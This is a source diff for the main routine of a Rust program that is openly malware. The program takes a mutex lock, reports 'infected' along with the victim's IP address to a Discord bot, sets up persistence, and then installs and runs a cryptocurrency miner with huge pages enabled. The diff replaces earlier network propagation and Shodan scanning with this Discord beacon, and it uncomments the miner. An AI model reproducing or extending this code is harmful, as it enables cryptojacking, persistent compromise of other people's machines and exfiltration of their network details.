@@ -1,15 +1,13 @@
 mod persistance;
-mod propogate;
-mod network;
-mod shodan;
+mod discord;
 mod miner;
 mod mutex;
 
-use network::Network;
+use discord::Discord;
 use miner::Miner;
 
 use env_logger::{Builder, Env};
-use log::{info, warn};
+use log::info;
 
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -17,33 +15,27 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     match mutex::lock() {
         Some(_) => {
-            info!("infecting system");
+            let mut discord = Discord::new();
+
+            discord.set_username("lapras bot");
+
+            discord.set_content(format!("infected: {:?}", discord.get_ip()));
+
+            info!("response: {:?}", discord.send().map(|response| response.status()));
 
             persistance::init();
 
-            /*
             let miner = Miner::new();
 
             miner.install()?;
 
             miner.enable_huge_pages();
 
-            miner.run()?;
-            */
+            let mut handle = miner.run()?;
 
-            let mut network = Network::new();
-
-            // let propogate = propogate::spawn(network.should_close());
-
-            network.run();
-
-            info!("waiting for propogate to finish");
-
-            // let _ = propogate.join();
+            handle.wait()?;
         },
-        None => {
-            warn!("already infected");
-        },
+        None => {},
     }
 
     Ok(())
